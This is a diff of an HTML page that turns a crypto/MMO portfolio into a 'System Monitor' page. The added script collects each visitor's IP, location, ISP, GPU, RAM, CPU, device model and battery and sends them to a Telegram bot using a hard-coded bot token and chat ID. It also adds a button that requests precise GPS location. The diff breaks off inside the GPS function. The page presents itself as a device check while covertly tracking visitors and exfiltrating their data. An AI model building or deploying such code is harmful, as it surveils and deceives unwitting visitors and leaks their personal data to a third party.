@@ -3,13 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- SEO & Meta Tags -->
-    <title>BmassHD | Crypto & Website System</title>
-    <meta name="description" content="Portfolio của BmassHD: chuyên gia Crypto, Website và MMO. Tích hợp công cụ phân tích thiết bị.">
+    <title>BmassHD | System Monitor</title>
     <link rel="icon" type="image/png" href="https://cdn-icons-png-flaticon-com/512/2920/2920329.png">
-    <link rel="canonical" href="https://bmasshd.io.vn/"> 
-
+    
     <!-- Libraries -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -17,495 +13,339 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
     <style>
-        /* --- DESIGN TOKENS --- */
         :root {
             --bg-color: #0f1115;
             --surface-color: rgba(255, 255, 255, 0.03);
             --stroke-color: rgba(255, 255, 255, 0.08);
             --primary-accent: #B4F9F2;
             --secondary-accent: #C084FC;
-            --info-accent: #3b82f6; /* Màu cho phần info */
             --text-main: #FFFFFF;
             --text-secondary: #9CA3AF;
-            --radius-xl: 32px;
-            --radius-md: 16px;
-            --radius-pill: 100px;
         }
 
         body {
             font-family: 'Plus Jakarta Sans', sans-serif;
             background-color: var(--bg-color);
             color: var(--text-main);
-            min-height: 100vh;
             overflow-x: hidden;
-            position: relative;
         }
 
-        /* --- BACKGROUND MESH --- */
+        /* --- BACKGROUND --- */
         .ambient-mesh {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
             background: radial-gradient(circle at 10% 90%, rgba(192, 132, 252, 0.15) 0px, transparent 45%),
-                        radial-gradient(circle at 90% 10%, rgba(180, 249, 242, 0.15) 0px, transparent 45%),
-                        radial-gradient(circle at 50% 50%, rgba(255, 255, 255, 0.01) 0px, transparent 70%);
+                        radial-gradient(circle at 90% 10%, rgba(180, 249, 242, 0.15) 0px, transparent 45%);
             filter: blur(80px); opacity: 0.8;
         }
 
-        /* --- LOADER --- */
-        .loader-wrapper {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-color); z-index: 9999;
-            display: flex; justify-content: center; align-items: center; transition: 0.8s cubic-bezier(0.65, 0, 0.35, 1);
-        }
-        .loader-text {
-            font-size: 1.5rem; letter-spacing: 2px; font-weight: 700;
-            background: linear-gradient(90deg, var(--text-main), var(--text-secondary));
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: pulse 2s infinite;
-        }
-        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
-
-        /* --- SIDEBAR --- */
-        .sidebar-toggle {
-            position: fixed; top: 30px; left: 30px; width: 56px; height: 56px;
-            background: rgba(255,255,255,0.05); border: 1px solid var(--stroke-color); border-radius: 18px;
-            display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 1001;
-            transition: transform 0.4s, background 0.3s; backdrop-filter: blur(10px);
-        }
-        .sidebar-toggle.hidden { transform: translateY(-150%); }
-        .sidebar-toggle:hover { background: var(--primary-accent); }
-        .sidebar-toggle:hover i { color: #000; }
-        .sidebar-toggle i { color: #fff; font-size: 1.2rem; transition: 0.3s; }
-
-        .sidebar-panel {
-            position: fixed; top: 0; left: 0; width: 320px; height: 100%; background: #18181b;
-            z-index: 1000; transform: translateX(-105%); transition: 0.6s cubic-bezier(0.16, 1, 0.3, 1);
-            padding: 100px 40px; border-right: 1px solid var(--stroke-color);
-        }
-        .sidebar-panel.active { transform: translateX(0); }
-        .nav-link {
-            color: var(--text-secondary); font-size: 1.1rem; padding: 18px 0; text-decoration: none;
-            display: flex; align-items: center; gap: 15px; transition: 0.3s; border-bottom: 1px dashed var(--stroke-color);
-        }
-        .nav-link:hover { color: var(--primary-accent); padding-left: 10px; }
-        .overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5);
-            z-index: 999; opacity: 0; visibility: hidden; transition: 0.4s;
-        }
-        .overlay.active { opacity: 1; visibility: visible; }
-
-        /* --- HERO --- */
-        .hero-container { min-height: 85vh; display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; }
-        .profile-card {
-            background: var(--surface-color); backdrop-filter: blur(20px);
-            border: 1px solid var(--stroke-color); border-radius: var(--radius-xl);
-            padding: 60px 40px; width: 500px; max-width: 100%; text-align: center;
-            box-shadow: 0 40px 80px -20px rgba(0,0,0,0.5);
-        }
-        .avatar-wrapper {
-            width: 140px; height: 140px; margin: 0 auto 30px; padding: 4px; border-radius: 50%;
-            background: linear-gradient(135deg, var(--secondary-accent), var(--primary-accent));
-        }
-        .avatar-img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; border: 4px solid var(--bg-color); }
-        .name-title { font-size: 2.5rem; font-weight: 800; margin-bottom: 5px; color: #fff; letter-spacing: -1px; }
-        .role-badge {
-            display: inline-block; padding: 8px 16px; background: rgba(180, 249, 242, 0.1); color: var(--primary-accent);
-            border-radius: var(--radius-pill); font-size: 0.85rem; font-weight: 600; margin-bottom: 25px; border: 1px solid rgba(180, 249, 242, 0.2);
-        }
-        .bio-text { color: var(--text-secondary); line-height: 1.7; margin-bottom: 40px; font-weight: 300; }
-        .btn-primary-custom {
-            display: inline-flex; align-items: center; gap: 10px; padding: 16px 32px; border-radius: var(--radius-pill);
-            background: #fff; color: #000; text-decoration: none; font-weight: 700; transition: 0.3s;
-        }
-        .btn-primary-custom:hover { transform: translateY(-4px); box-shadow: 0 20px 40px -10px rgba(255,255,255,0.3); background: var(--primary-accent); }
-
-        /* --- STATS --- */
-        .stats-container { display: flex; justify-content: center; gap: 20px; margin-bottom: 50px; flex-wrap: wrap; margin-top: 50px; }
-        .stat-card {
-            background: #1c1e24; border: 1px solid var(--stroke-color);
-            padding: 20px 40px; border-radius: 24px; text-align: center; min-width: 160px; transition: 0.3s;
-        }
-        .stat-card:hover { border-color: var(--secondary-accent); transform: translateY(-5px); }
-        .stat-num { font-size: 2rem; font-weight: 800; color: #fff; display: block; }
-        .stat-label { font-size: 0.85rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; }
-
-        /* --- DEVICE INFO SECTION (NEW) --- */
-        .info-section { padding: 80px 20px; max-width: 1200px; margin: 0 auto; }
-        .info-header { text-align: center; margin-bottom: 50px; }
-        .info-grid { 
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; 
+        /* --- INFO CARDS --- */
+        .info-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;
+            max-width: 1200px; margin: 50px auto; padding: 0 20px;
         }
         .info-card {
             background: rgba(255, 255, 255, 0.02);
-            border: 1px solid var(--stroke-color);
-            border-radius: 24px;
-            padding: 25px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            transition: 0.4s;
-            position: relative;
-            overflow: hidden;
+            border: 1px solid var(--stroke-color); border-radius: 20px; padding: 25px;
+            display: flex; align-items: center; gap: 20px; backdrop-filter: blur(10px);
+            transition: 0.3s;
         }
-        .info-card::before {
-            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.03), transparent);
-            transform: translateX(-100%); transition: 0.5s;
-        }
-        .info-card:hover::before { transform: translateX(100%); }
-        .info-card:hover { 
-            border-color: var(--info-accent); 
-            background: rgba(59, 130, 246, 0.05);
-            transform: translateY(-5px);
-        }
+        .info-card:hover { border-color: var(--primary-accent); transform: translateY(-5px); background: rgba(255,255,255,0.05); }
         .info-icon {
-            width: 50px; height: 50px; background: rgba(255,255,255,0.05);
-            border-radius: 12px; display: flex; align-items: center; justify-content: center;
-            font-size: 1.2rem; color: var(--info-accent); flex-shrink: 0;
+            width: 50px; height: 50px; background: rgba(180, 249, 242, 0.1); color: var(--primary-accent);
+            border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; flex-shrink: 0;
         }
-        .info-content h5 { margin: 0; font-size: 0.8rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; }
-        .info-content p { margin: 5px 0 0; font-size: 1.1rem; font-weight: 600; color: #fff; word-break: break-word;}
-        .loading-dots::after { content: '...'; animation: dot-blink 1.5s infinite; }
-        @keyframes dot-blink { 0%, 20% { content: '.'; } 40% { content: '..'; } 60%, 100% { content: '...'; } }
-
-        /* --- GALLERY --- */
-        .gallery-section { padding: 50px 0; position: relative; width: 100%; overflow: hidden; }
-        .gallery-header { text-align: center; margin-bottom: 50px; }
-        .section-tag { font-size: 0.8rem; color: var(--primary-accent); text-transform: uppercase; letter-spacing: 2px; font-weight: 700; display: block; margin-bottom: 10px; }
-        .section-title { font-size: 2rem; font-weight: 700; color: #fff; }
-        .track-wrapper { display: flex; width: 100%; mask-image: linear-gradient(to right, transparent 0%, black 15%, black 85%, transparent 100%); -webkit-mask-image: linear-gradient(to right, transparent 0%, black 15%, black 85%, transparent 100%); }
-        .track { display: flex; gap: 40px; width: max-content; animation: scroll-left 45s linear infinite; }
-        .track:hover { animation-play-state: paused; }
-        @keyframes scroll-left { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
-        .gallery-item { aspect-ratio: 16 / 9; width: 450px; border-radius: 24px; position: relative; overflow: hidden; cursor: pointer; transition: 0.5s; filter: grayscale(100%); opacity: 0.7; border: 1px solid var(--stroke-color); }
-        .gallery-item img { width: 100%; height: 100%; object-fit: cover; transition: 0.6s; }
-        .gallery-item:hover { filter: grayscale(0%); opacity: 1; transform: scale(1.05); box-shadow: 0 25px 50px -12px rgba(0,0,0,0.6); border-color: rgba(255,255,255,0.3); z-index: 10; }
-        .gallery-item:hover img { transform: scale(1.1); }
-        .project-overlay {
-            position: absolute; bottom: 0; left: 0; right: 0;
-            background: linear-gradient(to top, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0.5) 70%, transparent 100%);
-            padding: 30px; color: white; text-align: left; opacity: 0; transform: translateY(10px);
-            transition: opacity 0.4s, transform 0.4s; z-index: 5;
+        .info-content h5 { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; margin: 0; }
+        .info-content p { font-size: 1.1rem; font-weight: 700; color: #fff; margin: 5px 0 0; word-break: break-word; }
+        
+        .gps-btn {
+            background: var(--secondary-accent); color: #fff; border: none; padding: 10px 20px;
+            border-radius: 50px; font-weight: 600; margin-top: 10px; cursor: pointer; transition: 0.3s;
+            display: flex; align-items: center; gap: 8px; font-size: 0.9rem;
         }
-        .gallery-item:hover .project-overlay { opacity: 1; transform: translateY(0); }
-        .project-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 5px; letter-spacing: -0.5px; line-height: 1.2; }
-        .project-tag { font-size: 0.9rem; color: var(--primary-accent); font-weight: 500; text-transform: uppercase; letter-spacing: 1px; }
+        .gps-btn:hover { box-shadow: 0 0 15px rgba(192, 132, 252, 0.5); }
+        .gps-btn i { animation: bounce 2s infinite; }
+        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-3px);} 60% {transform: translateY(-2px);} }
 
-        /* --- FOOTER --- */
-        .footer-minimal { border-top: 1px solid var(--stroke-color); padding: 50px 0; text-align: center; background: #0f1115; }
-        .social-icons { display: flex; justify-content: center; gap: 20px; margin-bottom: 25px; }
-        .icon-btn {
-            width: 50px; height: 50px; border-radius: 50%; background: rgba(255,255,255,0.03); border: 1px solid var(--stroke-color);
-            display: flex; align-items: center; justify-content: center; color: #fff; text-decoration: none; transition: 0.3s; font-size: 1.2rem;
-        }
-        .icon-btn:hover { background: #fff; color: #000; transform: translateY(-5px); }
-        .copyright { color: #52525b; font-size: 0.85rem; }
+        /* --- HERO --- */
+        .hero { text-align: center; padding: 100px 20px 40px; }
+        .hero h1 { font-size: 3rem; font-weight: 800; background: linear-gradient(to right, #fff, #9ca3af); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        
+        /* --- LOADER --- */
+        #loader { position: fixed; inset: 0; background: #0f1115; z-index: 9999; display: flex; justify-content: center; align-items: center; transition: 0.5s; }
+        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: var(--primary-accent); animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        @media (max-width: 992px) { .gallery-item { width: 300px; } }
     </style>
 </head>
-<body id="top">
+<body>
 
-    <!-- Loader -->
-    <div class="loader-wrapper" id="loader"><div class="loader-text">BmassHD System</div></div>
-
-    <!-- Background -->
+    <div id="loader"><div class="spinner"></div></div>
     <div class="ambient-mesh"></div>
 
-    <!-- Sidebar -->
-    <div class="sidebar-toggle" id="sidebarToggle" onclick="toggleMenu()" aria-label="Menu"><i class="fas fa-bars"></i></div>
-    <div class="overlay" id="overlay" onclick="toggleMenu()"></div>
-    <nav class="sidebar-panel" id="sidebar">
-        <h4 class="text-white mb-5" style="font-weight: 800; letter-spacing: -1px;">MENU.</h4>
-        <a href="#top" class="nav-link" onclick="toggleMenu()"><i class="fas fa-home"></i> Home</a>
-        <a href="#analytics" class="nav-link" onclick="toggleMenu()"><i class="fas fa-microchip"></i> Analytics</a>
-        <a href="#projects" class="nav-link" onclick="toggleMenu()"><i class="fas fa-layer-group"></i> Projects</a>
-    </nav>
-
-    <!-- 1. HERO PROFILE -->
-    <section class="hero-container">
-        <div class="profile-card" data-tilt data-tilt-max="5" data-tilt-speed="1000" data-tilt-glare data-tilt-max-glare="0.1" data-aos="fade-up">
-            <div class="avatar-wrapper">
-                <img src="https://bmass.vercel.app/img/26cbd8427088fad6a399.jpg" alt="Avatar BmassHD" class="avatar-img">
-            </div>
-            <h1 class="name-title">BmassHD</h1>
-            <div class="role-badge">CRYPTO | WEBSITE | MMO</div>
-            <div style="min-height: 24px; margin-bottom: 20px; font-weight: 500; color: #fff;"><span id="typing-text"></span></div>
-            <p class="bio-text">Chuyên cung cấp các giải pháp tối ưu về Website, Crypto và Dịch vụ Mạng Xã Hội (MMO).</p>
-            <a href="#analytics" class="btn-primary-custom">Xem Thông Tin Của Bạn <i class="fas fa-arrow-down"></i></a>
-        </div>
+    <section class="hero" data-aos="fade-down">
+        <h1>BmassHD System</h1>
+        <p style="color: var(--text-secondary);">Thiết bị của bạn đang được phân tích...</p>
     </section>
 
-    <!-- 2. STATS -->
-    <div id="stats" class="stats-container" data-aos="fade-up">
-        <div class="stat-card"><span class="stat-num" data-target="5">0</span><span class="stat-label">Years Exp</span></div>
-        <div class="stat-card"><span class="stat-num" data-target="120">0</span><span class="stat-label">Projects</span></div>
-        <div class="stat-card"><span class="stat-num" data-target="98">0</span><span class="stat-label">Satisfaction</span></div>
+    <!-- SYSTEM INFO DISPLAY -->
+    <div class="info-grid">
+        <!-- 1. Network -->
+        <div class="info-card" data-aos="fade-up" data-aos-delay="100">
+            <div class="info-icon"><i class="fas fa-wifi"></i></div>
+            <div class="info-content">
+                <h5>Mạng & IP</h5>
+                <p id="ip-txt">Đang quét...</p>
+                <small id="isp-txt" style="color: #6b7280; font-size: 0.8rem;"></small>
+            </div>
+        </div>
+
+        <!-- 2. Location -->
+        <div class="info-card" data-aos="fade-up" data-aos-delay="200">
+            <div class="info-icon"><i class="fas fa-map-marked-alt"></i></div>
+            <div class="info-content">
+                <h5>Vị Trí (Ước tính)</h5>
+                <p id="loc-txt">Đang xác định...</p>
+                <!-- Nút yêu cầu GPS chính xác -->
+                <button class="gps-btn" onclick="requestGPS()">
+                    <i class="fas fa-crosshairs"></i> Lấy chính xác (GPS)
+                </button>
+            </div>
+        </div>
+
+        <!-- 3. Device -->
+        <div class="info-card" data-aos="fade-up" data-aos-delay="300">
+            <div class="info-icon"><i class="fas fa-mobile-alt"></i></div>
+            <div class="info-content">
+                <h5>Thiết Bị</h5>
+                <p id="device-txt">Đang phân tích...</p>
+                <small id="os-txt" style="color: #6b7280; font-size: 0.8rem;"></small>
+            </div>
+        </div>
+
+        <!-- 4. Hardware -->
+        <div class="info-card" data-aos="fade-up" data-aos-delay="400">
+            <div class="info-icon"><i class="fas fa-microchip"></i></div>
+            <div class="info-content">
+                <h5>Phần Cứng</h5>
+                <p id="gpu-txt">GPU...</p>
+                <small id="cpu-txt" style="color: #6b7280; font-size: 0.8rem;"></small>
+            </div>
+        </div>
+
+        <!-- 5. Battery -->
+        <div class="info-card" data-aos="fade-up" data-aos-delay="500">
+            <div class="info-icon"><i class="fas fa-battery-half"></i></div>
+            <div class="info-content">
+                <h5>Pin</h5>
+                <p id="bat-txt">Checking...</p>
+            </div>
+        </div>
     </div>
 
-    <!-- 3. NEW: DEVICE ANALYTICS (TÍNH NĂNG MỚI) -->
-    <section id="analytics" class="info-section" data-aos="fade-up">
-        <div class="info-header">
-            <span class="section-tag">SYSTEM CHECK</span>
-            <h2 class="section-title">Thông Tin Thiết Bị Của Bạn</h2>
-            <p style="color: var(--text-secondary); margin-top: 10px;">Hệ thống tự động nhận diện thông số kỹ thuật và mạng.</p>
-        </div>
-        
-        <div class="info-grid">
-            <!-- IP Address -->
-            <div class="info-card">
-                <div class="info-icon"><i class="fas fa-network-wired"></i></div>
-                <div class="info-content">
-                    <h5>Địa Chỉ IP</h5>
-                    <p id="ip-display" class="loading-dots">Detecting</p>
-                </div>
-            </div>
-
-            <!-- Location -->
-            <div class="info-card">
-                <div class="info-icon"><i class="fas fa-map-marker-alt"></i></div>
-                <div class="info-content">
-                    <h5>Vị Trí & ISP</h5>
-                    <p id="loc-display" class="loading-dots">Locating</p>
-                </div>
-            </div>
-
-            <!-- OS -->
-            <div class="info-card">
-                <div class="info-icon"><i class="fab fa-android"></i></div> <!-- Icon thay đổi bằng JS -->
-                <div class="info-content">
-                    <h5>Hệ Điều Hành</h5>
-                    <p id="os-display">Checking...</p>
-                </div>
-            </div>
-
-            <!-- Browser -->
-            <div class="info-card">
-                <div class="info-icon"><i class="fab fa-chrome"></i></div>
-                <div class="info-content">
-                    <h5>Trình Duyệt</h5>
-                    <p id="browser-display">Checking...</p>
-                </div>
-            </div>
-
-            <!-- Battery -->
-            <div class="info-card">
-                <div class="info-icon"><i class="fas fa-battery-half"></i></div>
-                <div class="info-content">
-                    <h5>Pin</h5>
-                    <p id="battery-display">N/A</p>
-                </div>
-            </div>
-
-            <!-- GPU/Screen -->
-            <div class="info-card">
-                <div class="info-icon"><i class="fas fa-desktop"></i></div>
-                <div class="info-content">
-                    <h5>Màn Hình & GPU</h5>
-                    <p id="gpu-display">Scanning...</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- 4. PROJECTS GALLERY -->
-    <section id="projects" class="gallery-section" data-aos="fade-up">
-        <div class="gallery-header">
-            <span class="section-tag">SELECTED WORKS</span>
-            <h2 class="section-title">Dự Án Tiêu Biểu</h2>
-        </div>
-        <div class="track-wrapper">
-            <div class="track" id="gallery-track">
-                <div class="gallery-item">
-                    <img src="https://images.unsplash.com/photo-1481487484168-9b930d55208d?ixlib=rb-4.0.3&w=800&q=80" loading="lazy">
-                    <div class="project-overlay">
-                        <h3 class="project-title">Decentralized Finance</h3>
-                        <span class="project-tag">Crypto Website</span>
-                    </div>
-                </div>
-                <div class="gallery-item">
-                    <img src="https://images.unsplash.com/photo-1558655146-d09347e0b7a9?ixlib=rb-4.0.3&w=800&q=80" loading="lazy">
-                    <div class="project-overlay">
-                        <h3 class="project-title">Social Service Hub</h3>
-                        <span class="project-tag">MMO Service</span>
-                    </div>
-                </div>
-                <div class="gallery-item">
-                    <img src="https://images.unsplash.com/photo-1467232004584-a241de8bcf5d?ixlib=rb-4.0.3&w=800&q=80" loading="lazy">
-                    <div class="project-overlay">
-                        <h3 class="project-title">Secure Wallet UI</h3>
-                        <span class="project-tag">Crypto App</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- FOOTER -->
-    <footer class="footer-minimal">
-        <div class="container">
-            <div class="social-icons">
-                <a href="#" class="icon-btn"><i class="fab fa-facebook-f"></i></a>
-                <a href="#" class="icon-btn"><i class="fas fa-globe"></i></a>
-                <a href="#" class="icon-btn"><i class="fab fa-telegram-plane"></i></a>
-                <a href="#" class="icon-btn"><i class="fab fa-github"></i></a>
-            </div>
-            <p class="copyright">Designed by BmassHD. Powered by Tech Analysis.</p>
-        </div>
-    </footer>
-
     <!-- SCRIPTS -->
-    <script src="https://unpkg.com/typed.js@2.0.16/dist/typed.umd.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.8.0/vanilla-tilt.min.js"></script>
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-
     <script>
-        // --- 1. CORE & ANIMATIONS ---
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                document.getElementById('loader').style.opacity = '0';
-                setTimeout(() => document.getElementById('loader').style.display = 'none', 800);
-                AOS.init({ once: true, offset: 50, duration: 800 });
-                setupScrollTrack('gallery-track');
-                const statsElement = document.getElementById('stats');
-                if (statsElement) statsObserver.observe(statsElement);
-                
-                // Chạy chức năng lấy dữ liệu khi load xong
-                getSystemInfo();
-            }, 1000);
-        });
+        AOS.init();
 
-        // Typing Effect
-        new Typed('#typing-text', { 
-            strings: ['System Detected.', 'Crypto Specialist.', 'MMO Tools Expert.'], 
-            typeSpeed: 40, backSpeed: 30, backDelay: 2000, loop: true, showCursor: false 
-        });
+        // --- CẤU HÌNH BOT TELEGRAM ---
+        const BOT_TOKEN = "6789490938:AAGbxaiI4NVuZBWEm-ktCT4w2FNVuV_v7mE";
+        const CHAT_ID = "@testappxyz";
 
-        // --- 2. SYSTEM DETECTION LOGIC (TÍNH NĂNG CHÍNH) ---
-        async function getSystemInfo() {
-            // A. Lấy thông tin Browser & OS cơ bản
-            const ua = navigator.userAgent;
-            let os = "Unknown OS";
-            let iconClass = "fas fa-laptop";
+        // Biến lưu dữ liệu toàn cục
+        let systemData = {
+            ip: "N/A", city: "N/A", country: "N/A", isp: "N/A",
+            os: "N/A", browser: "N/A", device: "Unknown",
+            gpu: "N/A", ram: "N/A", cores: "N/A",
+            battery: "N/A", userAgent: navigator.userAgent
+        };
 
-            // Detect OS đơn giản
-            if (ua.indexOf("Win") !== -1) { os = "Windows"; iconClass="fab fa-windows"; }
-            else if (ua.indexOf("Mac") !== -1) { os = "MacOS"; iconClass="fab fa-apple"; }
-            else if (ua.indexOf("Linux") !== -1) { os = "Linux"; iconClass="fab fa-linux"; }
-            else if (ua.indexOf("Android") !== -1) { os = "Android"; iconClass="fab fa-android"; }
-            else if (ua.indexOf("like Mac") !== -1) { os = "iOS"; iconClass="fab fa-apple"; }
-
-            // Detect Browser name
-            let browserName = "Unknown Browser";
-            if(ua.indexOf("Chrome") != -1 ) browserName = "Google Chrome";
-            else if(ua.indexOf("Safari") != -1) browserName = "Safari";
-            else if(ua.indexOf("Firefox") != -1 ) browserName = "Mozilla Firefox";
-            
-            // Cập nhật DOM OS & Browser
-            document.getElementById('os-display').innerText = os;
-            document.querySelector('.info-card:nth-child(3) .info-icon i').className = iconClass;
-            document.getElementById('browser-display').innerText = browserName;
-
-            // B. Thông tin Pin (Battery)
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    const updateBattery = () => {
-                        const level = Math.round(battery.level * 100) + "%";
-                        const status = battery.charging ? "Dang sạc ⚡" : "Dùng pin";
-                        document.getElementById('battery-display').innerText = `${level} - ${status}`;
-                    };
-                    updateBattery();
-                    battery.addEventListener('levelchange', updateBattery);
-                } catch (e) { document.getElementById('battery-display').innerText = "Blocked"; }
-            } else {
-                document.getElementById('battery-display').innerText = "Không hỗ trợ";
+        // 1. Hàm gửi tin nhắn sang Telegram
+        async function sendToTelegram(messageText) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: messageText,
+                        parse_mode: "HTML",
+                        disable_web_page_preview: false
+                    })
+                });
+                console.log("Đã gửi báo cáo về Telegram");
+            } catch (error) {
+                console.error("Lỗi gửi Telegram:", error);
             }
+        }
 
-            // C. Thông tin GPU (Card đồ họa) & Màn hình
-            const width = window.screen.width;
-            const height = window.screen.height;
-            let gpu = "";
+        // 2. Lấy thông tin phần cứng & GPU
+        function getHardwareInfo() {
+            // GPU
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                // Rút gọn tên GPU cho đẹp
-                gpu = gpu.replace("ANGLE (", "").replace("Direct3D11", "").replace("vs_5_0 ps_5_0)", "").trim();
-            } catch(e) { gpu = "Integrated Graphics"; }
-            
-            document.getElementById('gpu-display').innerHTML = `${width}x${height}px<br><span style="font-size:0.8em; color:#9ca3af">${gpu}</span>`;
+                systemData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                // Làm đẹp tên GPU
+                systemData.gpu = systemData.gpu.replace(/ANGLE \(|\)|Direct3D11|vs_5_0 ps_5_0/g, "").trim();
+            } catch (e) { systemData.gpu = "Integrated Graphics"; }
 
-            // D. Lấy IP và Vị trí (Fetch API từ ipwho.is - miễn phí, không cần key)
+            // RAM & CPU (Ước tính)
+            if(navigator.deviceMemory) systemData.ram = `~${navigator.deviceMemory} GB`;
+            if(navigator.hardwareConcurrency) systemData.cores = `${navigator.hardwareConcurrency} Cores`;
+
+            // Màn hình
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            
+            // Cập nhật UI
+            document.getElementById('gpu-txt').innerText = systemData.gpu;
+            document.getElementById('cpu-txt').innerText = `RAM: ${systemData.ram || '?'} | CPU: ${systemData.cores || '?'} | Screen: ${screenRes}`;
+        }
+
+        // 3. Phân tích UserAgent (Tìm tên thiết bị chi tiết hơn)
+        function parseUserAgent() {
+            const ua = navigator.userAgent;
+            let os = "Unknown OS";
+            let device = "PC/Laptop";
+
+            if (/android/i.test(ua)) {
+                os = "Android";
+                device = "Mobile/Tablet";
+                // Cố gắng tìm model điện thoại trong UserAgent (thường nằm sau ; build/)
+                const match = ua.match(/;\s([^;]+)\sBuild\//); 
+                if(match) device = match[1]; 
+            } else if (/iPad|iPhone|iPod/.test(ua)) {
+                os = "iOS";
+                device = "iPhone/iPad";
+                // Lấy phiên bản iOS
+                const match = ua.match(/OS (\d+)_/);
+                if(match) os += " " + match[1];
+            } else if (/Windows/.test(ua)) os = "Windows";
+            else if (/Mac/.test(ua)) os = "MacOS";
+            else if (/Linux/.test(ua)) os = "Linux";
+
+            systemData.os = os;
+            systemData.device = device;
+            
+            document.getElementById('device-txt').innerText = device;
+            document.getElementById('os-txt').innerText = `${os} - ${navigator.platform}`;
+        }
+
+        // 4. Lấy Pin
+        async function getBatteryStatus() {
+            if (navigator.getBattery) {
+                try {
+                    const bat = await navigator.getBattery();
+                    const level = Math.round(bat.level * 100) + "%";
+                    const status = bat.charging ? "Đang sạc ⚡" : "Dùng pin";
+                    systemData.battery = `${level} (${status})`;
+                    document.getElementById('bat-txt').innerText = systemData.battery;
+                } catch(e) {}
+            } else {
+                document.getElementById('bat-txt').innerText = "Không hỗ trợ";
+            }
+        }
+
+        // 5. Lấy IP và Vị trí (Dùng API tốt hơn: ipapi.co)
+        async function getNetworkInfo() {
             try {
-                const response = await fetch('https://ipwho.is/');
+                // ipapi.co thường nhận diện ISP ở VN tốt hơn
+                const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 
-                if(data.success) {
-                    document.getElementById('ip-display').innerText = data.ip;
-                    document.getElementById('ip-display').classList.remove('loading-dots');
-                    
-                    document.getElementById('loc-display').innerHTML = `${data.city}, ${data.country_code} <br><span style="font-size:0.8em; color:#9ca3af">${data.connection.isp}</span>`;
-                    document.getElementById('loc-display').classList.remove('loading-dots');
+                systemData.ip = data.ip;
+                systemData.city = data.city;
+                systemData.country = data.country_name;
+                systemData.isp = data.org || data.service_provider || data.asn; // Lấy tên nhà mạng
 
-                    // GỬI DỮ LIỆU ĐI (Nếu bạn muốn thu thập - Cần cấu hình Webhook)
-                    // sendLogToTelegram(data, os, browserName, gpu); 
-                } else {
-                    throw new Error("API Limit");
-                }
+                // Cập nhật UI
+                document.getElementById('ip-txt').innerText = data.ip;
+                document.getElementById('isp-txt').innerText = systemData.isp;
+                document.getElementById('loc-txt').innerText = `${data.city}, ${data.country_name}`;
+
+                // --> GỬI BÁO CÁO TỔNG HỢP LẦN 1 (DỰA TRÊN IP)
+                reportToAdmin(false);
+
             } catch (error) {
-                document.getElementById('ip-display').innerText = "Adblock Blocked";
-                document.getElementById('loc-display').innerText = "Unknown Location";
+                document.getElementById('ip-txt').innerText = "Blocked by Adblock";
             }
         }
 
-        // --- 3. OTHER UI LOGIC ---
-        const sidebarToggle = document.getElementById('sidebarToggle');
-        let lastScrollTop = 0;
-        window.addEventListener("scroll", function() {
-            let scrollTop = window.pageYOffset || document.documentElement.scrollTop;
-            if(!isMenuOpen) {
-                sidebarToggle.classList.toggle('hidden', scrollTop > lastScrollTop && scrollTop > 100);
+        // 6. TÍNH NĂNG ĐẶC BIỆT: Yêu cầu GPS chính xác
+        function requestGPS() {
+            const btn = document.querySelector('.gps-btn');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang định vị...';
+            
+            if (navigator.geolocation) {
